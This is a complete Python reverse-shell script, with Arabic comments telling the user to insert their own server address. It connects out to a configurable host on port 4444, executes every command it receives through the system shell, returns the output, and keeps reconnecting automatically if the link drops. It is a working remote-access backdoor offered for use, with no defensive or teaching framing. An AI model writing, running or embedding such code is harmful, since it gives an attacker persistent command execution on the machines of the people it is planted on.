import socket
import subprocess
import os
import time

def connect():
    target_ip = '127.0.0.1'  # ضع عنوان IP الخاص بسيرفرك هنا (أو النطاق)
    target_port = 4444

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            
            while True:
                command = s.recv(1024).decode('utf-8', errors='ignore')
                if not command or command.lower() == 'exit':
                    break
                
                if command.startswith('cd '):
                    try:
                        os.chdir(command[3:].strip())
                        output = f"Changed directory to {os.getcwd()}\n"
                    except Exception as e:
                        output = str(e) + "\n"
                else:
                    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output = proc.stdout.read() + proc.stderr.read()
                    if not output:
                        output = b"[+] Command executed successfully.\n"
                
                s.send(output)
        except Exception:
            time.sleep(5) # إعادة المحاولة التلقائية في حال انقطع الاتصال
        finally:
            s.close()

if __name__ == '__main__':
    connect()
